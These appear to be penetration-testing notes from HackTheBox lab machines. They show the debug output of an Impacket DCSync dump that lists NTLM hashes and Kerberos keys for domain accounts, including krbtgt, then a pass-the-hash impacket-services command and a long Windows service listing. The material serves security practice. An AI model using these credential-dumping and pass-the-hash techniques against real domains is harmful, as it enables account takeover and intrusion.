[2025-08-08 11:31:02] [+] Leaving NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:02] [+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-501 
[2025-08-08 11:31:02] [+] Calling DRSGetNCChanges for {b1298768-336d-40ba-a901-1da65816b899} 
[2025-08-08 11:31:03] [+] Entering NTDSHashes.__decryptHash
[2025-08-08 11:31:03] [+] Decrypting hash for user: CN=Guest,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[2025-08-08 11:31:03] [+] Leaving NTDSHashes.__decryptHash
[2025-08-08 11:31:03] [+] Entering NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:03] [+] Leaving NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:03] [+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-502 
[2025-08-08 11:31:03] [+] Calling DRSGetNCChanges for {63708f6a-ff17-4c00-9d92-dae7b3f739ec} 
[2025-08-08 11:31:04] [+] Entering NTDSHashes.__decryptHash
[2025-08-08 11:31:04] [+] Decrypting hash for user: CN=krbtgt,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
[2025-08-08 11:31:04] [+] Leaving NTDSHashes.__decryptHash
[2025-08-08 11:31:04] [+] Entering NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:04] [+] Leaving NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:04] [+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-1103 
[2025-08-08 11:31:04] [+] Calling DRSGetNCChanges for {9283072d-a2e1-4f8b-a34b-a16d6a979fa3} 
[2025-08-08 11:31:05] [+] Entering NTDSHashes.__decryptHash
[2025-08-08 11:31:05] [+] Decrypting hash for user: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
[2025-08-08 11:31:05] [+] Leaving NTDSHashes.__decryptHash
[2025-08-08 11:31:05] [+] Entering NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:05] [+] Leaving NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:05] [+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-1105 
[2025-08-08 11:31:05] [+] Calling DRSGetNCChanges for {b6a6403e-a7df-4abf-92fb-b5bf1a5e3aed} 
[2025-08-08 11:31:06] [+] Entering NTDSHashes.__decryptHash
[2025-08-08 11:31:06] [+] Decrypting hash for user: CN=Fergus Smith,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
[2025-08-08 11:31:06] [+] Leaving NTDSHashes.__decryptHash
[2025-08-08 11:31:06] [+] Entering NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:06] [+] Leaving NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:06] [+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-1108 
[2025-08-08 11:31:06] [+] Calling DRSGetNCChanges for {c84a4266-b01d-4a64-8c2d-ed930d18c489} 
[2025-08-08 11:31:06] [+] Entering NTDSHashes.__decryptHash
[2025-08-08 11:31:06] [+] Decrypting hash for user: CN=L Manager,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
[2025-08-08 11:31:06] [+] Leaving NTDSHashes.__decryptHash
[2025-08-08 11:31:06] [+] Entering NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:06] [+] Leaving NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:06] [+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-1000 
[2025-08-08 11:31:07] [+] Calling DRSGetNCChanges for {9f1d1db5-ce78-498d-aa90-16781495f771} 
[2025-08-08 11:31:07] [+] Entering NTDSHashes.__decryptHash
[2025-08-08 11:31:07] [+] Decrypting hash for user: CN=SAUNA,OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:7504784e68bb600a12667dc85792f5c1:::
[2025-08-08 11:31:07] [+] Leaving NTDSHashes.__decryptHash
[2025-08-08 11:31:07] [+] Entering NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:07] [+] Leaving NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:07] [+] Finished processing and printing user's hashes, now printing supplemental information
[2025-08-08 11:31:07] [*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:61155c90d28dfdea0aa2a08137574ce725e848688c5b75ce6dea57ae6cf41358
SAUNA$:aes128-cts-hmac-sha1-96:bb87c1e28416c3423848c16da0893d55
SAUNA$:des-cbc-md5:623143264c38bac7
[2025-08-08 11:31:07] [*] Cleaning up..
```


## services
### list
```sh
└─$ impacket-services -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.95.210' list
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] StringBinding ncacn_np:10.129.95.210[\pipe\svcctl]
[*] Listing services available on target
                      1394ohci -                                    1394 OHCI Compliant Host Controller -  STOPPED
                         3ware -                                                                  3ware -  RUNNING
                          ACPI -                                                  Microsoft ACPI Driver -  RUNNING
                       AcpiDev -                                                    ACPI Devices driver -  STOPPED
                        acpiex -                                                Microsoft ACPIEx Driver -  RUNNING
                      acpipagr -                                       ACPI Processor Aggregator Driver -  STOPPED
                       AcpiPmi -                                                ACPI Power Meter Driver -  STOPPED
                      acpitime -                                                 ACPI Wake Alarm Driver -  STOPPED
                       ADP80XX -                                                                ADP80XX -  RUNNING
                          ADWS -                                          Active Directory Web Services -  RUNNING
                           AFD -                                  Ancillary Function Driver for Winsock -  RUNNING
                       ahcache -                                        Application Compatibility Cache -  RUNNING
                         AmdK8 -                                                AMD K8 Processor Driver -  STOPPED
                        AmdPPM -                                                   AMD Processor Driver -  RUNNING
                       amdsata -                                                                amdsata -  RUNNING
                        amdsbs -                                                                 amdsbs -  RUNNING
                       amdxata -                                                                amdxata -  RUNNING
                         AppID -                                                           AppID Driver -  STOPPED
                      AppIDSvc -                                                   Application Identity -  STOPPED
                 applockerfltr -                                              Smartlocker Filter Driver -  STOPPED
                       AppMgmt -                                                 Application Management -  STOPPED
                       AppXSvc -                                      AppX Deployment Service (AppXSVC) -  STOPPED
                        arcsas -                    Adaptec SAS/SATA-II RAID Storport's Miniport Driver -  RUNNING
                      AsyncMac -                                          RAS Asynchronous Media Driver -  STOPPED
                         atapi -                                                            IDE Channel -  RUNNING
                       b06bdrv -                                             QLogic Network Adapter VBD -  RUNNING
                  BasicDisplay -                                                           BasicDisplay -  RUNNING
                   BasicRender -                                                            BasicRender -  RUNNING
                     bfadfcoei -                                                              bfadfcoei -  RUNNING
                         bfadi -                                                                  bfadi -  RUNNING
                           BFE -                                                  Base Filtering Engine -  RUNNING
                          BITS -                                Background Intelligent Transfer Service -  STOPPED
                        bowser -                                                 Browser Support Driver -  RUNNING
                       Browser -                                                       Computer Browser -  STOPPED
                        bxfcoe -                                             QLogic FCoE Offload driver -  RUNNING
                         bxois -                                            QLogic Offload iSCSI Driver -  RUNNING
                          cdfs -                                              CD/DVD File System Reader -  STOPPED
                         cdrom -                                                          CD-ROM Driver -  STOPPED
                   CertPropSvc -                                                Certificate Propagation -  STOPPED
                     cht4iscsi -                                                              cht4iscsi -  STOPPED
                       cht4vbd -                                             Chelsio Virtual Bus Driver -  STOPPED
                          CLFS -                                                      Common Log (CLFS) -  RUNNING
                       ClipSVC -                                       Client License Service (ClipSVC) -  STOPPED
                        CmBatt -                           Microsoft ACPI Control Method Battery Driver -  RUNNING
                           CNG -                                                                    CNG -  RUNNING
                  CompositeBus -                                        Composite Bus Enumerator Driver -  RUNNING
                     COMSysApp -                                                COM+ System Application -  RUNNING
                        ConDrv -                                                         Console Driver -  RUNNING
        CoreMessagingRegistrar -                                                          CoreMessaging -  RUNNING
                      CryptSvc -                                                 Cryptographic Services -  RUNNING
                    DcomLaunch -                                           DCOM Server Process Launcher -  RUNNING
                     defragsvc -                                                        Optimize drives -  STOPPED
                 DeviceInstall -                                                 Device Install Service -  STOPPED
                           Dfs -                                                          DFS Namespace -  RUNNING
                          Dfsc -                                            DFS Namespace Client Driver -  RUNNING
                     DfsDriver -                                     DFS Namespace Server Filter Driver -  RUNNING
                          DFSR -                                                        DFS Replication -  RUNNING
                        DfsrRo -                                        DFS Replication ReadOnly Driver -  RUNNING
                          Dhcp -                                                            DHCP Client -  RUNNING
diagnosticshub.standardcollector.service -               Microsoft (R) Diagnostics Hub Standard Collector Service -  STOPPED
                     DiagTrack -                               Connected User Experiences and Telemetry -  RUNNING
                          disk -                                                            Disk Driver -  RUNNING
                         dmvsc -                                                                  dmvsc -  STOPPED
                           DNS -                                                             DNS Server -  RUNNING
                      Dnscache -                                                             DNS Client -  RUNNING
                           DPS -                                              Diagnostic Policy Service -  RUNNING
                     DsRoleSvc -                                                         DS Role Server -  STOPPED
                       DXGKrnl -                                                LDDM Graphics Subsystem -  RUNNING
                    e1iexpress -              Intel(R) PRO/1000 PCI Express Network Connection Driver I -  RUNNING
                       EapHost -                                     Extensible Authentication Protocol -  STOPPED
                         ebdrv -                                 QLogic 10 Gigabit Ethernet Adapter VBD -  RUNNING
                           EFS -                                           Encrypting File System (EFS) -  RUNNING
                       elxfcoe -                                                                elxfcoe -  RUNNING
                       elxstor -                                                                elxstor -  RUNNING
                        ErrDev -                                 Microsoft Hardware Error Device Driver -  STOPPED
                      EventLog -                                                      Windows Event Log -  RUNNING
                   EventSystem -                                                      COM+ Event System -  RUNNING
                         exfat -                                               exFAT File System Driver -  STOPPED
                       fastfat -                                         FAT12/16/32 File System Driver -  RUNNING
                         fcvsc -                                                                  fcvsc -  STOPPED
                           fdc -                                          Floppy Disk Controller Driver -  STOPPED
                       fdPHost -                                       Function Discovery Provider Host -  STOPPED
                      FileInfo -                                         File Information FS MiniFilter -  STOPPED
                      flpydisk -                                                     Floppy Disk Driver -  STOPPED
                        FltMgr -                                                                 FltMgr -  RUNNING
                     FontCache -                                             Windows Font Cache Service -  STOPPED
                     FsDepends -                                      File System Dependency Minifilter -  STOPPED
                    gencounter -                                   Microsoft Hyper-V Generation Counter -  RUNNING
                   GPIOClx0101 -                                  Microsoft GPIO Class Extension Driver -  STOPPED
                         gpsvc -                                                    Group Policy Client -  RUNNING
                       HidBatt -                                                 HID UPS Battery Driver -  STOPPED
                       hidserv -                                         Human Interface Device Service -  STOPPED
                        HidUsb -                                             Microsoft HID Class Driver -  STOPPED
                        HpSAMD -                                                                 HpSAMD -  RUNNING
                          HTTP -                                                           HTTP Service -  RUNNING
                        HvHost -                                                        HV Host Service -  STOPPED
                     hvservice -                              Hypervisor/Virtual Machine Support Driver -  STOPPED
                      hwpolicy -                                                 Hardware Policy Driver -  STOPPED
                      hyperkbd -                                                               hyperkbd -  STOPPED
                    HyperVideo -                                                             HyperVideo -  STOPPED
                      i8042prt -                              i8042 Keyboard and PS/2 Mouse Port Driver -  RUNNING
                      iaStorAV -                                  Intel(R) SATA RAID Controller Windows -  RUNNING
                       iaStorV -                                        Intel RAID Controller Windows 7 -  RUNNING
                         ibbus -                             Mellanox InfiniBand Bus/AL (Filter Driver) -  STOPPED
                        IKEEXT -                                    IKE and AuthIP IPsec Keying Modules -  RUNNING
                      intelide -                                                               intelide -  RUNNING
                      intelppm -                                                 Intel Processor Driver -  STOPPED
                      iphlpsvc -                                                              IP Helper -  RUNNING
                       IPMIDRV -                                                                IPMIDRV -  STOPPED
                         IPNAT -                                          IP Network Address Translator -  STOPPED
                       IPsecGW -                                           Windows IPsec Gateway Driver -  STOPPED
                        isapnp -                                                                 isapnp -  RUNNING
                      iScsiPrt -                                                       iScsiPort Driver -  STOPPED
                       IsmServ -                                                    Intersite Messaging -  RUNNING
                      kbdclass -                                                  Keyboard Class Driver -  RUNNING
                        kbdhid -                                                    Keyboard HID Driver -  STOPPED
                           Kdc -                                       Kerberos Key Distribution Center -  RUNNING
                         kdnic -                    Microsoft Kernel Debug Network Miniport (NDIS 6.20) -  RUNNING
                        KdsSvc -                                     Microsoft Key Distribution Service -  STOPPED
                        KeyIso -                                                      CNG Key Isolation -  STOPPED
                        KPSSVC -                                         KDC Proxy Server service (KPS) -  STOPPED
                        KSecDD -                                                                 KSecDD -  RUNNING
                       KSecPkg -                                                                KSecPkg -  RUNNING
                         KtmRm -                          KtmRm for Distributed Transaction Coordinator -  STOPPED
                  LanmanServer -                                                                 Server -  RUNNING
             LanmanWorkstation -                                                            Workstation -  RUNNING
                        lltdio -                        Link-Layer Topology Discovery Mapper I/O Driver -  RUNNING
                       lltdsvc -                                   Link-Layer Topology Discovery Mapper -  STOPPED
                       lmhosts -                                                  TCP/IP NetBIOS Helper -  RUNNING
                       LSI_SAS -                                                                LSI_SAS -  RUNNING
                     LSI_SAS2i -                                                              LSI_SAS2i -  RUNNING
                     LSI_SAS3i -                                                              LSI_SAS3i -  RUNNING
                       LSI_SSS -                                                                LSI_SSS -  RUNNING
                           LSM -                                                  Local Session Manager -  RUNNING
                       megasas -                                                                megasas -  RUNNING
                        megasr -                                                                 megasr -  RUNNING
                      mlx4_bus -                                       Mellanox ConnectX Bus Enumerator -  STOPPED
                       monitor -                        Microsoft Monitor Class Function Driver Service -  RUNNING
                      mouclass -                                                     Mouse Class Driver -  RUNNING
                        mouhid -                                                       Mouse HID Driver -  STOPPED
                      mountmgr -                                                    Mount Point Manager -  RUNNING
                        mpsdrv -                                  Windows Firewall Authorization Driver -  RUNNING
                        MpsSvc -                                                       Windows Firewall -  RUNNING
                        mrxsmb -                                  SMB MiniRedirector Wrapper and Engine -  RUNNING
                      mrxsmb10 -                                                 SMB 1.x MiniRedirector -  RUNNING
                      mrxsmb20 -                                                 SMB 2.0 MiniRedirector -  RUNNING
                         MSDTC -                                    Distributed Transaction Coordinator -  RUNNING
                          Msfs -                                                                   Msfs -  RUNNING
                      msisadrv -                                                               msisadrv -  RUNNING
                       MSiSCSI -                                      Microsoft iSCSI Initiator Service -  STOPPED
                     msiserver -                                                      Windows Installer -  STOPPED
                MsLbfoProvider -                             Microsoft Load Balancing/Failover Provider -  STOPPED
                         MsRPC -                                                                  MsRPC -  STOPPED
                      mssmbios -                                Microsoft System Management BIOS Driver -  RUNNING
                      MTConfig -                                   Microsoft Input Configuration Driver -  STOPPED
                           Mup -                                                                    Mup -  RUNNING
                        mvumis -                                                                 mvumis -  RUNNING
                        NcaSvc -                                         Network Connectivity Assistant -  STOPPED
                        ndfltr -                                                  NetworkDirect Service -  STOPPED
                          NDIS -                                                     NDIS System Driver -  RUNNING
                       NdisCap -                                                 Microsoft NDIS Capture -  STOPPED
                NdisImPlatform -                         Microsoft Network Adapter Multiplexor Protocol -  STOPPED
                      NdisTapi -                                         Remote Access NDIS TAPI Driver -  STOPPED
                       Ndisuio -                                             NDIS Usermode I/O Protocol -  STOPPED
                NdisVirtualBus -                           Microsoft Virtual Network Adapter Enumerator -  RUNNING
                       NdisWan -                                          Remote Access NDIS WAN Driver -  STOPPED
                 ndiswanlegacy -                                   Remote Access LEGACY NDIS WAN Driver -  STOPPED
                       ndproxy -                @%SystemRoot%\system32\drivers\todo.sys,-101;NDIS Proxy -  STOPPED
                       NetBIOS -                                                      NetBIOS Interface -  RUNNING
                         NetBT -                                                                  NetBT -  RUNNING
                      Netlogon -                                                               Netlogon -  RUNNING
                      netprofm -                                                   Network List Service -  RUNNING
                   NetSetupSvc -                                                  Network Setup Service -  STOPPED
             NetTcpPortSharing -                                           Net.Tcp Port Sharing Service -  STOPPED
                        netvsc -                                                                 netvsc -  STOPPED
                        NlaSvc -                                             Network Location Awareness -  RUNNING
                          Npfs -                                                                   Npfs -  RUNNING
                     npsvctrig -                                    Named pipe service trigger provider -  RUNNING
                           nsi -                                        Network Store Interface Service -  RUNNING
                      nsiproxy -                                               NSI Proxy Service Driver -  RUNNING
                          NTDS -                                       Active Directory Domain Services -  RUNNING
                         NtFrs -                                                       File Replication -  STOPPED
                          Ntfs -                                                                   Ntfs -  RUNNING
                          Null -                                                                   Null -  RUNNING
                        nvraid -                                                                 nvraid -  RUNNING
                        nvstor -                                                                 nvstor -  RUNNING
                       Parport -                                                   Parallel port driver -  STOPPED
                       partmgr -                                                       Partition driver -  RUNNING
                           pci -                                                         PCI Bus Driver -  RUNNING
                        pciide -                                                                 pciide -  RUNNING
                           pcw -                                Performance Counters for Windows Driver -  RUNNING
                           pdc -                                                                    pdc -  RUNNING
                     percsas2i -                                                              percsas2i -  RUNNING
                     percsas3i -                                                              percsas3i -  RUNNING
                      PerfHost -                                           Performance Counter DLL Host -  STOPPED
                           pla -                                              Performance Logs & Alerts -  STOPPED
                      PlugPlay -                                                          Plug and Play -  RUNNING
                   PolicyAgent -                                                     IPsec Policy Agent -  RUNNING
                         Power -                                                                  Power -  RUNNING
                  PptpMiniport -                                                    WAN Miniport (PPTP) -  STOPPED
                     Processor -                                                       Processor Driver -  STOPPED
                       ProfSvc -                                                   User Profile Service -  RUNNING
                        Psched -                                                   QoS Packet Scheduler -  RUNNING
                       ql2300i -                 QLogic Fibre Channel STOR Miniport Inbox Driver (wx64) -  RUNNING
                      ql40xx2i -                                     QLogic iSCSI Miniport Inbox Driver -  RUNNING
                       qlfcoei -                        QLogic [FCoE] STOR Miniport Inbox Driver (wx64) -  RUNNING
                   RasAgileVpn -                                                   WAN Miniport (IKEv2) -  STOPPED
                        RasGre -                                                     WAN Miniport (GRE) -  STOPPED
                       Rasl2tp -                                                    WAN Miniport (L2TP) -  STOPPED
                        RasMan -                                       Remote Access Connection Manager -  STOPPED
                      RasPppoe -                                             Remote Access PPPOE Driver -  STOPPED
                       RasSstp -                                                    WAN Miniport (SSTP) -  STOPPED
                         rdbss -                                        Redirected Buffering Sub System -  RUNNING
                         RDPDR -                                Remote Desktop Device Redirector Driver -  STOPPED
              RdpVideoMiniport -                                   Remote Desktop Video Miniport Driver -  STOPPED
                          ReFS -                                                                   ReFS -  STOPPED
                        ReFSv1 -                                                                 ReFSv1 -  STOPPED
                  RemoteAccess -                                              Routing and Remote Access -  STOPPED
                RemoteRegistry -                                                        Remote Registry -  STOPPED
                  RpcEptMapper -                                                    RPC Endpoint Mapper -  RUNNING
                         RpcSs -                                            Remote Procedure Call (RPC) -  RUNNING
                      RSoPProv -                                       Resultant Set of Policy Provider -  STOPPED
                        rspndr -                                Link-Layer Topology Discovery Responder -  RUNNING
                         s3cap -                                                                  s3cap -  STOPPED
                        sacdrv -                                                                 sacdrv -  STOPPED
                        sacsvr -                                  Special Administration Console Helper -  STOPPED
                         SamSs -                                              Security Accounts Manager -  RUNNING
                      sbp2port -                                    SBP-2 Transport/Protocol Bus Driver -  RUNNING
                      SCardSvr -                                                             Smart Card -  STOPPED
                  ScDeviceEnum -                                  Smart Card Device Enumeration Service -  STOPPED
                      scfilter -                                     Smart card PnP Class Filter Driver -  STOPPED
                      Schedule -                                                         Task Scheduler -  RUNNING
                        scmbus -                              Microsoft Storage Class Memory Bus Driver -  RUNNING
                   scmdisk0101 -                                         Microsoft NVDIMM-N disk driver -  STOPPED
                   SCPolicySvc -                                              Smart Card Removal Policy -  STOPPED
                      seclogon -                                                        Secondary Logon -  STOPPED
                          SENS -                                      System Event Notification Service -  RUNNING
                         SerCx -                                            Serial UART Support Library -  STOPPED
                       Serenum -                                                  Serenum Filter Driver -  STOPPED
                        Serial -                                                     Serial port driver -  STOPPED
                      sermouse -                                                    Serial Mouse Driver -  STOPPED
                    SessionEnv -                                           Remote Desktop Configuration -  STOPPED
                       sfloppy -                                        High-Capacity Floppy Disk Drive -  STOPPED
                  SharedAccess -                                      Internet Connection Sharing (ICS) -  STOPPED
                      SiSRaid2 -                                                               SiSRaid2 -  RUNNING
                      SiSRaid4 -                                                               SiSRaid4 -  RUNNING
                     smbdirect -                                                              smbdirect -  STOPPED
                       smphost -                                           Microsoft Storage Spaces SMP -  STOPPED
                      SNMPTRAP -                                                              SNMP Trap -  STOPPED
                     spaceport -                                                  Storage Spaces Driver -  RUNNING
                         SpbCx -                                  Simple Peripheral Bus Support Library -  STOPPED
                       Spooler -                                                          Print Spooler -  STOPPED
                        sppsvc -                                                    Software Protection -  STOPPED
                           srv -                                                Server SMB 1.xxx Driver -  RUNNING
                          srv2 -                                                Server SMB 2.xxx Driver -  RUNNING
                        srvnet -                                                                 srvnet -  RUNNING
                       SstpSvc -                               Secure Socket Tunneling Protocol Service -  STOPPED
               StateRepository -                                               State Repository Service -  STOPPED
                      stexstor -                                                               stexstor -  RUNNING
                      storahci -                                    Microsoft Standard SATA AHCI Driver -  RUNNING
                       storflt -                                  Microsoft Hyper-V Storage Accelerator -  RUNNING
                      stornvme -                                  Microsoft Standard NVM Express Driver -  RUNNING
                    storqosflt -                                              Storage QoS Filter Driver -  RUNNING
                       storvsc -                                                                storvsc -  RUNNING
                         svsvc -                                                          Spot Verifier -  STOPPED
                        swenum -                                                    Software Bus Driver -  RUNNING
                         swprv -                                Microsoft Software Shadow Copy Provider -  STOPPED
                    Synth3dVsc -                                                             Synth3dVsc -  STOPPED
                       SysMain -                                                             Superfetch -  STOPPED
            SystemEventsBroker -                                                   System Events Broker -  RUNNING
                         Tcpip -                                                 TCP/IP Protocol Driver -  RUNNING
                        Tcpip6 -                          @todo.dll,-100;Microsoft IPv6 Protocol Driver -  STOPPED
                      tcpipreg -                                          TCP/IP Registry Compatibility -  RUNNING
                           tdx -                                        NetIO Legacy TDI Support Driver -  RUNNING
                      terminpt -                                  Microsoft Remote Desktop Input Driver -  STOPPED
                   TermService -                                                Remote Desktop Services -  STOPPED
          TieringEngineService -                                               Storage Tiers Management -  STOPPED
                 TimeBrokerSvc -                                                            Time Broker -  RUNNING
                           TPM -                                                                    TPM -  STOPPED
              TrustedInstaller -                                              Windows Modules Installer -  STOPPED
                      tsusbhub -                                                 Remote Desktop USB Hub -  STOPPED
                        tunnel -                               Microsoft Tunnel Miniport Adapter Driver -  RUNNING
                        UALSVC -                                            User Access Logging Service -  RUNNING
                      UASPStor -                                         USB Attached SCSI (UAS) Driver -  RUNNING
                      Ucx01000 -                                               USB Host Support Library -  RUNNING
                          udfs -                                                                   udfs -  STOPPED
                          UEFI -                                                  Microsoft UEFI Driver -  STOPPED
                         umbus -                                                UMBus Enumerator Driver -  RUNNING
                        UmPass -                                                Microsoft UMPass Driver -  STOPPED
                  UmRdpService -                       Remote Desktop Services UserMode Port Redirector -  STOPPED
                       usbccgp -                                    Microsoft USB Generic Parent Driver -  RUNNING
                       usbehci -             Microsoft USB 2.0 Enhanced Host Controller Miniport Driver -  RUNNING
                        usbhub -                                      Microsoft USB Standard Hub Driver -  RUNNING
                       USBHUB3 -                                                         SuperSpeed Hub -  RUNNING
                       usbohci -                     Microsoft USB Open Host Controller Miniport Driver -  STOPPED
                      usbprint -                                            Microsoft USB PRINTER Class -  STOPPED
                        usbser -                                            Microsoft USB Serial Driver -  STOPPED
                       USBSTOR -                                                USB Mass Storage Driver -  RUNNING
                       usbuhci -                Microsoft USB Universal Host Controller Miniport Driver -  STOPPED
                       USBXHCI -                                     USB xHCI Compliant Host Controller -  RUNNING
                   UserManager -                                                           User Manager -  RUNNING
                        UsoSvc -                         Update Orchestrator Service for Windows Update -  STOPPED
                      VaultSvc -                                                     Credential Manager -  STOPPED
                      vdrvroot -                                     Microsoft Virtual Drive Enumerator -  RUNNING
                           vds -                                                           Virtual Disk -  RUNNING
                   VerifierExt -                                                            VerifierExt -  STOPPED
                 VGAuthService -                                VMware Alias Manager and Ticket Service -  RUNNING
                         vhdmp -                                                                  vhdmp -  STOPPED
                        vm3dmp -                                                                 vm3dmp -  RUNNING
                  vm3dmp-debug -                                                           vm3dmp-debug -  STOPPED
                  vm3dmp-stats -                                                           vm3dmp-stats -  STOPPED
                 vm3dmp_loader -                                                          vm3dmp_loader -  RUNNING
                         vmbus -                                                    Virtual Machine Bus -  RUNNING
                      VMBusHID -                                                               VMBusHID -  STOPPED
                          vmci -                                                 VMware VMCI Bus Driver -  RUNNING
                         vmgid -                          Microsoft Hyper-V Guest Infrastructure Driver -  STOPPED
            vmicguestinterface -                                        Hyper-V Guest Service Interface -  STOPPED
                 vmicheartbeat -                                              Hyper-V Heartbeat Service -  STOPPED
               vmickvpexchange -                                          Hyper-V Data Exchange Service -  STOPPED
                       vmicrdv -                          Hyper-V Remote Desktop Virtualization Service -  STOPPED
                  vmicshutdown -                                         Hyper-V Guest Shutdown Service -  STOPPED
                  vmictimesync -                                   Hyper-V Time Synchronization Service -  STOPPED
                 vmicvmsession -                                      Hyper-V PowerShell Direct Service -  STOPPED
                       vmicvss -                                   Hyper-V Volume Shadow Copy Requestor -  STOPPED
                      vmmemctl -                                                  Memory Control Driver -  RUNNING
                       vmmouse -                                                 VMware Pointing Device -  RUNNING
                       VMTools -                                                           VMware Tools -  RUNNING
                    vmusbmouse -                                             VMware USB Pointing Device -  STOPPED
                         vmvss -                                               VMware Snapshot Provider -  STOPPED
     VMwareCAFCommAmqpListener -                                  VMware CAF AMQP Communication Service -  STOPPED
  VMwareCAFManagementAgentHost -                                    VMware CAF Management Agent Service -  STOPPED
                        volmgr -                                                  Volume Manager Driver -  RUNNING
                       volmgrx -                                                 Dynamic Volume Manager -  RUNNING
                       volsnap -                                              Volume Shadow Copy driver -  RUNNING
                        volume -                                                          Volume driver -  RUNNING
                          vpci -                                      Microsoft Hyper-V Virtual PCI Bus -  STOPPED
                       vsmraid -                                                                vsmraid -  RUNNING
                         vsock -        vSockets Virtual Machine Communication Interface Sockets driver -  RUNNING
                           VSS -                                                     Volume Shadow Copy -  STOPPED
                      VSTXRAID -                       VIA StorX Storage RAID Controller Windows Driver -  RUNNING
                       W32Time -                                                           Windows Time -  RUNNING
                      WacomPen -                                            Wacom Serial Pen HID Driver -  STOPPED
                        wanarp -                                            Remote Access IP ARP Driver -  STOPPED
                      wanarpv6 -                                          Remote Access IPv6 ARP Driver -  STOPPED
                        WdBoot -                                           Windows Defender Boot Driver -  STOPPED
                      Wdf01000 -                                  Kernel Mode Driver Frameworks service -  RUNNING
                      WdFilter -                                    Windows Defender Mini-Filter Driver -  RUNNING
                WdiServiceHost -                                                Diagnostic Service Host -  STOPPED
                 WdiSystemHost -                                                 Diagnostic System Host -  STOPPED
                      WdNisDrv -                      Windows Defender Network Inspection System Driver -  STOPPED
                      WdNisSvc -                            Windows Defender Network Inspection Service -  STOPPED
                        Wecsvc -                                                Windows Event Collector -  STOPPED
                        WerSvc -                                        Windows Error Reporting Service -  STOPPED
                       WFPLWFS -                                   Microsoft Windows Filtering Platform -  RUNNING
                      WIMMount -                                                               WIMMount -  STOPPED
                     WinDefend -                                               Windows Defender Service -  RUNNING
           WinHttpAutoProxySvc -                               WinHTTP Web Proxy Auto-Discovery Service -  RUNNING
                        WinMad -                                                         WinMad Service -  STOPPED
                       Winmgmt -                                     Windows Management Instrumentation -  RUNNING
                        WinNat -                                                     Windows NAT Driver -  STOPPED
                         WinRM -                              Windows Remote Management (WS-Management) -  RUNNING
                        WINUSB -                                                          WinUsb Driver -  STOPPED
                      WinVerbs -                                                       WinVerbs Service -  STOPPED
                         wisvc -                                                Windows Insider Service -  STOPPED
                       WmiAcpi -                        Microsoft Windows Management Interface for ACPI -  STOPPED
                      wmiApSrv -                                                WMI Performance Adapter -  STOPPED
